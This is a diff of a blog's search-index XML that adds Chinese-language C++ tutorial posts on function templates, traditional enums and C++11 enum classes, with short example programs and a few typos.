@@ -36,6 +36,43 @@
       </tags>
   </entry>
   <entry>
+    <title>C++中的函数模板</title>
+    <url>/2022/04/29/C-%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<h1 id="函数模板简介"><a href="#函数模板简介" class="headerlink" title="函数模板简介"></a>函数模板简介</h1><p>模板是C++的高级特性，分为<strong>函数模板</strong>和<strong>类模板</strong>，使用模板能够快速建立具有类型安全的类库合集和函数合集。</p>
+<p>这里我们主要介绍<strong>函数模板</strong></p>
+<p>函数模板不是一个实在的函数，编译器不能为其生成可执行代码。定义函数模板最后只是一个对函数功能框架的描述，当它具体执行时，将根据传递的实际参数决定功能。</p>
+<span id="more"></span>
+
+<h1 id="函数模板的定义"><a href="#函数模板的定义" class="headerlink" title="函数模板的定义"></a>函数模板的定义</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;参数类型及参数&gt; 返回类型 函数名 (形式参数)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可以声明函数模板分成template部分和函数部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;参数类型&gt;</span><br><span class="line">返回类型 函数名 (形式参数)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>template为关键字，表示定义一个模板。<br>&lt;&gt;表示模板参数，模板参数有两种，是<strong>模板类型参数</strong>、<strong>模板非类型参数</strong>。模板类型参数使用关键字<strong>class或typedef</strong>开始，后面跟一个合法类型名。模板非类型参数与普通参数定义相同，通常是一个常数。可以不使用模板非类型参数。</p>
+<p>下面以<strong>求和函数为例解释函数模板</strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//定义求和函数模板 </span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type</span>&gt;</span> <span class="comment">//这里的type可以是任意类型，关键看传入的是什么类型 </span></span><br><span class="line"><span class="function">type <span class="title">sum</span><span class="params">(type x,type y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line">	<span class="keyword">int</span> s=sum&lt;<span class="keyword">int</span>&gt;(a,b);<span class="comment">//调用函数模板 </span></span><br><span class="line">	cout&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">double</span> c=<span class="number">1.23</span>;</span><br><span class="line">	<span class="keyword">double</span> d=<span class="number">2.45</span>;</span><br><span class="line">	<span class="keyword">double</span> m=sum&lt;<span class="keyword">double</span>&gt;(c,d);<span class="comment">//调用函数模板 </span></span><br><span class="line">	cout&lt;&lt;m;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对如上代码进行解释：<br>首先是声明一个模板<code>template&lt;calss type&gt;</code>，然后是定义函数模板的具体实现方法</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数模板								//自定义函数</span></span><br><span class="line"><span class="function">type <span class="title">sum</span><span class="params">(type x,type y)</span>				   <span class="comment">//int sum(int x,int y)	</span></span></span><br><span class="line"><span class="function"></span>&#123;									   <span class="comment">//&#123;</span></span><br><span class="line">    <span class="keyword">return</span> x+y;						   <span class="comment">//	return x+y;</span></span><br><span class="line">&#125;									   <span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>相比之下，模板函数在声明类型的情况下可以实现各种运算，而自定义函数只能实现单纯的int运算。</p>
+<p>所以，定义函数模板的有点就是<strong>适应各种类型对象</strong>的计算和输出。</p>
+<p>最后就是函数模板的调用</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s=sum&lt;<span class="keyword">int</span>&gt;(a,b);</span><br><span class="line"><span class="keyword">double</span> m=sum&lt;<span class="keyword">double</span>&gt;(c,d);</span><br></pre></td></tr></table></figure>
+
+<p>这里的int和double就是使用模板的方式，即模板类型。若除去&lt;&gt;，就变成了</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s=<span class="built_in">sum</span>(a,b);</span><br><span class="line"><span class="keyword">double</span> m=<span class="built_in">sum</span>(c,d);</span><br></pre></td></tr></table></figure>
+
+<p>这个跟自定义函数的使用方法相同。</p>
+<h1 id="函数模板入门应用"><a href="#函数模板入门应用" class="headerlink" title="函数模板入门应用"></a>函数模板入门应用</h1><p>使用数组作为模板参数，分别输出int数组和double数组的最大值</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type</span>,<span class="title">int</span> <span class="title">len</span>&gt;</span></span><br><span class="line"><span class="function">type <span class="title">max</span><span class="params">(type a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	type m=a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(a[i]&gt;m)</span><br><span class="line">		&#123;</span><br><span class="line">			m=a[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="keyword">double</span> y[]=&#123;<span class="number">1.2</span>,<span class="number">2.5</span>,<span class="number">1.6</span>,<span class="number">5.6</span>,<span class="number">7.8</span>,<span class="number">4.6</span>&#125;;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The max int is:&quot;</span>&lt;&lt;max&lt;<span class="keyword">int</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(x)/<span class="built_in"><span class="keyword">sizeof</span></span>(x[<span class="number">0</span>])&gt;(x)&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The max double is:&quot;</span>&lt;&lt;max&lt;<span class="keyword">double</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(y)/<span class="built_in"><span class="keyword">sizeof</span></span>(y[<span class="number">0</span>])&gt;(y);</span><br><span class="line">	<span class="comment">//补充：x.size()、x.length()是用于string类型的数组长度判断，不可用于整型 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C++中的循环结构和跳转语句</title>
     <url>/2021/12/16/C-%E4%B8%AD%E7%9A%84%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
     <content><![CDATA[<h1 id="一、循环结构"><a href="#一、循环结构" class="headerlink" title="一、循环结构"></a>一、循环结构</h1><h2 id="1-while循环结构"><a href="#1-while循环结构" class="headerlink" title="1.while循环结构"></a>1.while循环结构</h2><p>作用：满足循环条件，执行循环语句</p>
@@ -211,37 +248,69 @@
       </tags>
   </entry>
   <entry>
-    <title>C++中的函数模板</title>
-    <url>/2022/04/29/C-%E4%B8%AD%E7%9A%84%E7%B1%BB%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<h1 id="函数模板简介"><a href="#函数模板简介" class="headerlink" title="函数模板简介"></a>函数模板简介</h1><p>模板是C++的高级特性，分为<strong>函数模板</strong>和<strong>类模板</strong>，使用模板能够快速建立具有类型安全的类库合集和函数合集。</p>
-<p>这里我们主要介绍<strong>函数模板</strong></p>
-<p>函数模板不是一个实在的函数，编译器不能为其生成可执行代码。定义函数模板最后只是一个对函数功能框架的描述，当它具体执行时，将根据传递的实际参数决定功能。</p>
+    <title>C++中的枚举</title>
+    <url>/2022/05/01/C-%E4%B8%AD%E7%9A%84%E6%9E%9A%E4%B8%BE/</url>
+    <content><![CDATA[<p>众所周知，C/C++语言可以使用#define和const创建符号常量，而使用enum工具不仅能够创建符号常量，还能定义新的数据类型，但是必须按照一定的规则进行，下面我们一起看下enum的使用方法。</p>
 <span id="more"></span>
 
-<h1 id="函数模板的定义"><a href="#函数模板的定义" class="headerlink" title="函数模板的定义"></a>函数模板的定义</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;参数类型及参数&gt; 返回类型 函数名 (形式参数)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="枚举量的声明和定义"><a href="#枚举量的声明和定义" class="headerlink" title="枚举量的声明和定义"></a>枚举量的声明和定义</h1><p>（1）先看例句</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">enumType</span> &#123;</span>Monday, Tuesday, Wednesday, Thursday, Friday, Saturday, Sunday&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>也可以声明函数模板分成template部分和函数部分：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;参数类型&gt;</span><br><span class="line">返回类型 函数名 (形式参数)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这句话有两个作用：</p>
+<p>第一：声明enumType为新的数据类型，称为<strong>枚举</strong>(enumeration);</p>
+<p>第二：声明Monday、Tuesday等为符号常量，通常称之为<strong>枚举量</strong>，其<strong>值默认分别为0-6</strong>。（后面会介绍怎样显式的初始化<strong>枚举量</strong>的值）</p>
+<p>（2）接着利用新的枚举类型enumType声明这种类型的变量：<code>enumType Weekday;</code>就像使用基本变量类型int声明变量一样，如 <code>int a;</code>也可以在定义枚举类型时定义枚举变量<code>enum enumType &#123;Monday, Tuesday, Wednesday, Thursday, Friday, Saturday, Sunday&#125;Weekday;</code></p>
+<p>然而与基本变量类型不同的地方是，<strong>在不进行强制转换的前提下</strong>，只能将定义的<strong>枚举量</strong>赋值给该种枚举的变量，如：<code>Weekday = Monday;</code>或者<code>Weekday = Sunday;</code>不能将其他值赋给<strong>枚举变量</strong>，如：<code>Weekday = 10;</code>这是不允许的，因为10不是<strong>枚举量</strong>。也就是说Weekday只能是定义的Monday-Sunday这些定义过的<strong>枚举量</strong>。然而这不是绝对的，第六条会讲到利用强制类型转换将其他类型值赋给<strong>枚举变量</strong>。</p>
+<p>（3）上面讲不能将<strong>非枚举量</strong>赋给<strong>枚举变量</strong>，那么能不能将<strong>枚举量</strong>赋给<strong>非枚举变量</strong>呢？如：<code>int a=Monday;</code>这是允许的，因为<strong>枚举量</strong>是符号常量，这里的赋值编译器会自动把<strong>枚举量</strong>转换为int类型。</p>
+<p>（4）前面讲可以对枚举进行赋值运算，那<strong>枚举变量</strong>能不能进行算术运算呢？</p>
+<p><code>Weekday++;</code>、<code>Weekday = Monday + Tuesday;</code>这是非法的，因为<strong>这些操作可能导致违反类型限制</strong>，比如：<code>Weekday = Sunday;</code></p>
+<p><code>Weekday++;</code> Weekday首先被赋予<strong>枚举量</strong>中的最后一个值Sunday(值为6)，再进行递增的话，Weekday增加到7，而对于enumType类型来说，7是无效的。</p>
+<p><strong>总结：对于枚举，只定义了赋值运算符，没有为枚举定义算术运算。</strong></p>
+<p>（5）不能对枚举量进行算术运算，那么枚举量能不能<strong>参与其他类型变量的运算</strong>呢？<code>int a;  a = 1 + Monday;</code>这是允许的，因为编译器会自动把枚举量转换为int类型。</p>
+<p>（6）第二条讲：在不进行强制转换的前提下，只能将定义的枚举量赋值给该种枚举的变量，言下之意就是可以通过强制转换将其他类型值赋给枚举变量：</p>
+<p><code>Weekday = enumType(2);</code>等同于：<code>Weekday = Wednesday;</code>但是，如果试图将一个超出枚举取值范围的值通过强制转换赋给枚举变量，会出现什么结果？</p>
+<p><code>Weekday = enumType(20);</code>结果将是不确定的，这么做不会出错，但得不到想要的结果。</p>
+<h1 id="自定义枚举量的值"><a href="#自定义枚举量的值" class="headerlink" title="自定义枚举量的值"></a>自定义枚举量的值</h1><p>(1)前面讲通过定义<code>enum enumType &#123;Monday, Tuesday, Wednesday, Thursday, Friday, Saturday, Sunday&#125;;</code></p>
+<p><strong>枚举量</strong>Monday、Tuesday等的值默认分别为0-6，我们可以显式的设置<strong>枚举量</strong>的值：</p>
+<p><code>enum enumType &#123;Monday=1, Tuesday=2, Wednesday=3, Thursday=4, Friday=5, Saturday=6, Sunday=7&#125;;</code></p>
+<p>指定的值必须是<strong>整数</strong>！</p>
+<p>(2)也可以只显式的定义一部分<strong>枚举量</strong>的值：</p>
+<p><code>enum enumType &#123;Monday=1, Tuesday, Wednesday=1, Thursday, Friday, Saturday, Sunday&#125;;</code>这样Monday、Wednesday均被定义为1，则Tuesday=2，Thursday、Friday、Saturday、Sunday的值默认分别为2、3、4、5.<strong>总结：未被初始化的枚举值的值默认将比其前面的枚举值大1。</strong></p>
+<p>(3)第二条还说明另外一个现象，就是 <strong>枚举量 的值可以相同</strong>。</p>
+<h1 id="枚举的取值范围"><a href="#枚举的取值范围" class="headerlink" title="枚举的取值范围"></a>枚举的取值范围</h1><p>前面讲到可以通过强制转换将其他类型值赋给<strong>枚举变量：</strong><code>Weekday = enumType(2);</code>这是合法的；但是<code>Weekday = enumType(20);</code>是非法的。这里涉及<strong>枚举取值范围</strong>的概念：枚举的上限是 大于最大<strong>枚举量</strong>的 最小的2的幂，减去1；</p>
+<p>枚举的下限有两种情况：</p>
+<p>一、<strong>枚举量</strong>的最小值不小于0，则枚举下限取0；</p>
+<p>二、<strong>枚举量</strong>的最小值小于0，则枚举下限是 小于最小<strong>枚举量</strong>的 最大的2的幂，加上1。</p>
+<p>举例来讲：</p>
+<p>假如定义 <code>enum enumType1 &#123; First=-5，Second=14，Third=10 &#125;;</code>则枚举的上限是16-1=15（16大于最大<strong>枚举量</strong>14，且为2的幂）；  枚举的下限是-8+1=-7（-8小于最小<strong>枚举量</strong>-5，且为2的幂）；</p>
+<h1 id="枚举的应用"><a href="#枚举的应用" class="headerlink" title="枚举的应用"></a>枚举的应用</h1><p>个人觉得<strong>枚举</strong>和<strong>switch</strong>是最好的搭档：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">enumType</span>&#123;</span>Step0, Step1, Step2&#125;Step=Step0;<span class="comment">//注意这里在声明枚举的时候直接定义了枚举变量Step,并初始化为Step0</span></span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (Step)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> 	<span class="keyword">case</span> Step0:&#123;...;<span class="keyword">break</span>;&#125;</span><br><span class="line"></span><br><span class="line"> 	<span class="keyword">case</span> Step1:&#123;...;<span class="keyword">break</span>;&#125;</span><br><span class="line"></span><br><span class="line"> 	<span class="keyword">case</span> Step2:&#123;...;<span class="keyword">break</span>;&#125;</span><br><span class="line"></span><br><span class="line"> 	<span class="keyword">default</span>:<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>template为关键字，表示定义一个模板。<br>&lt;&gt;表示模板参数，模板参数有两种，是<strong>模板类型参数</strong>、<strong>模板非类型参数</strong>。模板类型参数使用关键字<strong>class或typedef</strong>开始，后面跟一个合法类型名。模板非类型参数与普通参数定义相同，通常是一个常数。可以不使用模板非类型参数。</p>
-<p>下面以<strong>求和函数为例解释函数模板</strong></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//定义求和函数模板 </span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type</span>&gt;</span> <span class="comment">//这里的type可以是任意类型，关键看传入的是什么类型 </span></span><br><span class="line"><span class="function">type <span class="title">sum</span><span class="params">(type x,type y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line">	<span class="keyword">int</span> s=sum&lt;<span class="keyword">int</span>&gt;(a,b);<span class="comment">//调用函数模板 </span></span><br><span class="line">	cout&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">double</span> c=<span class="number">1.23</span>;</span><br><span class="line">	<span class="keyword">double</span> d=<span class="number">2.45</span>;</span><br><span class="line">	<span class="keyword">double</span> m=sum&lt;<span class="keyword">double</span>&gt;(c,d);<span class="comment">//调用函数模板 </span></span><br><span class="line">	cout&lt;&lt;m;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>另外枚举还有一种少见的用法是 <code>enum &#123; one ,two ,three&#125;;</code> 就是不指定一个名字,这样我们自然也没法去定义一些枚举类型了。此时就相当于<code>static const int one = 0;</code>这样定义三个常量一样。然后用的话就是<code>int no = one</code>。</p>
+<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><strong>强类型枚举（Strongly-typed enums）</strong>，号称枚举类型，是C++11中的新语法，用以解决传统C++枚举类型存在的缺陷。传统C++中枚举常量被暴漏在外层作用域中，这样若是同一作用域下有两个不同的枚举类型，但含有相同的枚举常量也是不可的，比如：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Side</span>&#123;</span>Right,Left&#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Thing</span>&#123;</span>Wrong,Right&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>对如上代码进行解释：<br>首先是声明一个模板<code>template&lt;calss type&gt;</code>，然后是定义函数模板的具体实现方法</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数模板								//自定义函数</span></span><br><span class="line"><span class="function">type <span class="title">sum</span><span class="params">(type x,type y)</span>				   <span class="comment">//int sum(int x,int y)	</span></span></span><br><span class="line"><span class="function"></span>&#123;									   <span class="comment">//&#123;</span></span><br><span class="line">    <span class="keyword">return</span> x+y;						   <span class="comment">//	return x+y;</span></span><br><span class="line">&#125;									   <span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这是不能一起用的。<br>另外一个缺陷是传统枚举值总是被隐式转换为整形，用户无法自定义类型。C++11中的强类型枚举解决了这些问题。</p>
+<h2 id="二、强类型枚举"><a href="#二、强类型枚举" class="headerlink" title="二、强类型枚举"></a>二、强类型枚举</h2><p> <strong>强类型枚举使用enum class语法来声明</strong>，如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Enumeration</span>&#123;</span></span><br><span class="line"> VAL1,</span><br><span class="line"> VAL2,</span><br><span class="line"> VAL3=<span class="number">100</span>,</span><br><span class="line"> VAL4</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>相比之下，模板函数在声明类型的情况下可以实现各种运算，而自定义函数只能实现单纯的int运算。</p>
-<p>所以，定义函数模板的有点就是<strong>适应各种类型对象</strong>的计算和输出。</p>
-<p>最后就是函数模板的调用</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s=sum&lt;<span class="keyword">int</span>&gt;(a,b);</span><br><span class="line"><span class="keyword">double</span> m=sum&lt;<span class="keyword">double</span>&gt;(c,d);</span><br></pre></td></tr></table></figure>
+<p>这样，枚举类型是安全的，枚举值也不会被隐式转换为整数，无法和整数数值比较，比如（Enumeration：：VAL4==10会触发编译错误）。</p>
+<p>另外枚举类型所使用的类型默认为int类型，也可指定其他类型，比如：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">calss</span> <span class="title">Enum</span>:</span><span class="keyword">unsigned</span> <span class="keyword">int</span>&#123;VAL1,VAL2&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>这里的int和double就是使用模板的方式，即模板类型。若除去&lt;&gt;，就变成了</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s=<span class="built_in">sum</span>(a,b);</span><br><span class="line"><span class="keyword">double</span> m=<span class="built_in">sum</span>(c,d);</span><br></pre></td></tr></table></figure>
+<p>正如前面所说，强类型枚举能解决传统枚举不同枚举类下同枚举值名的问题，使用枚举类型的枚举名时，必须指明所属范围，比如：<code>Enum::VAL1</code>，而单独的VAL1则不再具有意义。</p>
+<p>还有一点值得说明的是C++11中枚举类型的前置声明也是可行的，比如：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">calss</span> <span class="title">Enum</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Enum1</span>:</span><span class="keyword">unsigned</span> <span class="keyword">int</span>;</span><br></pre></td></tr></table></figure>
 
-<p>这个跟自定义函数的使用方法相同。</p>
-<h1 id="函数模板入门应用"><a href="#函数模板入门应用" class="headerlink" title="函数模板入门应用"></a>函数模板入门应用</h1><p>使用数组作为模板参数，分别输出int数组和double数组的最大值</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type</span>,<span class="title">int</span> <span class="title">len</span>&gt;</span></span><br><span class="line"><span class="function">type <span class="title">max</span><span class="params">(type a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	type m=a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(a[i]&gt;m)</span><br><span class="line">		&#123;</span><br><span class="line">			m=a[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="keyword">double</span> y[]=&#123;<span class="number">1.2</span>,<span class="number">2.5</span>,<span class="number">1.6</span>,<span class="number">5.6</span>,<span class="number">7.8</span>,<span class="number">4.6</span>&#125;;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The max int is:&quot;</span>&lt;&lt;max&lt;<span class="keyword">int</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(x)/<span class="built_in"><span class="keyword">sizeof</span></span>(x[<span class="number">0</span>])&gt;(x)&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The max double is:&quot;</span>&lt;&lt;max&lt;<span class="keyword">double</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(y)/<span class="built_in"><span class="keyword">sizeof</span></span>(y[<span class="number">0</span>])&gt;(y);</span><br><span class="line">	<span class="comment">//补充：x.size()、x.length()是用于string类型的数组长度判断，不可用于整型 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="三、项目中的强类型枚举代码片段"><a href="#三、项目中的强类型枚举代码片段" class="headerlink" title="三、项目中的强类型枚举代码片段"></a>三、项目中的强类型枚举代码片段</h2><h2 id="1、图像处理"><a href="#1、图像处理" class="headerlink" title="1、图像处理"></a>1、图像处理</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Color</span>&#123;</span>RED,BLUE,YELLOR,BLACK,WHITE&#125;;</span><br></pre></td></tr></table></figure>
 
+<h2 id="2-交通灯"><a href="#2-交通灯" class="headerlink" title="2.交通灯"></a>2.交通灯</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">TrafficLight</span>&#123;</span>RED,YELLOR,GREEN&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>强类型枚举值具有传统枚举的功能——<strong>命名枚举值</strong>，同时又具有类的特点——<strong>具有类域的成员和无法进行默认的类型转换</strong>。所以也称之为<strong>枚举类</strong>——enmu class</p>
+<p>枚举类的底层数据必须是有符号或无符号整型，比如char unsigned int unsigned long，默认为int。</p>
+<h2 id="3-前置声明应用"><a href="#3-前置声明应用" class="headerlink" title="3.前置声明应用"></a>3.前置声明应用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">enmu <span class="class"><span class="keyword">class</span> <span class="title">Clolor</span>:</span><span class="keyword">char</span>;  <span class="comment">//前置声明枚举类</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Foo</span><span class="params">(Color*p)</span></span>;        <span class="comment">//前置声明的使用</span></span><br><span class="line"><span class="comment">//....................</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Color</span>:</span><span class="keyword">char</span>&#123;RED,GREEN,BLACK,WHITE&#125;;                       <span class="comment">//前置声明的定义</span></span><br></pre></td></tr></table></figure>
+
+<p>注：以上内容摘自<a href="https://blog.csdn.net/Bruce_0712/article/details/54984371?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165137198016782388043601%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165137198016782388043601&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-54984371.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Econtrol&utm_term=C++%E4%B8%AD%E7%9A%84%E6%9E%9A%E4%B8%BE&spm=1018.2226.3001.4187">csdn博主</a></p>
 ]]></content>
       <tags>
         <tag>C++</tag>
@@ -293,46 +362,30 @@
       </tags>
   </entry>
   <entry>
-    <title>C++中的选择选择语句</title>
-    <url>/2021/12/11/C-%E4%B8%AD%E7%9A%84%E9%80%89%E6%8B%A9%E8%AF%AD%E5%8F%A5/</url>
-    <content><![CDATA[<h1 id="一、if条件语句"><a href="#一、if条件语句" class="headerlink" title="一、if条件语句"></a>一、if条件语句</h1><p>作用：执行满足条件的语句</p>
-<p>if语句的三种形式</p>
-<ul>
-<li>单行格式if语句</li>
-<li>多行格式if语句</li>
-<li>多条件的if语句</li>
-</ul>
+    <title>C++中的类模板</title>
+    <url>/2022/05/01/C-%E4%B8%AD%E7%9A%84%E7%B1%BB%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<p>使用template关键字不但可以定义函数模板，也可以定义类模板，类模板代表一族类，是用来描述通用数据或处理方法的机制，它使类中的一些数据成员和成员函数的参数或返回值可以取任意的数据类型。类模板可以说是<strong>用类生成类</strong>，减少了类的定义数量。</p>
 <span id="more"></span>
 
-<h2 id="1-单行格式if语句"><a href="#1-单行格式if语句" class="headerlink" title="1.单行格式if语句"></a>1.单行格式if语句</h2><p>语法：<code>if(条件)&#123;条件满足时执行的语句&#125;</code></p>
